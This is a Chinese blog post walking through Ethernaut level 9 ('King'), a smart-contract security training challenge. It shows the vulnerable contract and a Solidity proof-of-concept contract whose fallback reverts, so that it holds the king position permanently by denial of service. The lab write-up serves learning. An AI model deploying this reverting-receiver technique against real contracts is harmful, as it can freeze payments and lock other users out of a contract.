---
title: '合约ddos-1'
date: 2022-12-10 19:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'

---

<!-- more -->

::: tip

目前来看最全面的智能合约安全靶场:+1:

https://ethernaut.openzeppelin.com/ 

浏览器控制台 help()指令

![help](./assets/1670479273112.png)

:::

#### 第九关king  思路与POC

##### 目标: 取得king的位置并想办法不让人抢走

#### 先看代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
  //部署者为第一个king
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    //将最新数量的token转给上一位king
    payable(king).transfer(msg.value);
    //刷新king身份和最新价格
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

##### poc思路:point_right:：其实很简单,只需要让转账失败即可 => ( payable(king).transfer(msg.value);) =>revert

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract badKing { 
      
    
     //特定接收转账函数,默认接收转账函数是receive
     function _receive() payable public {

     }
     //转账到King合约 参与游戏
     function getking(address payable addr) public returns(bool){
      
        (bool success,) = addr.call{value: address(this).balance}("");
        return success;
     }
  //但是不让King合约转账到此合约
     fallback() external payable  {
        revert("don't take my site");
    }
}
```

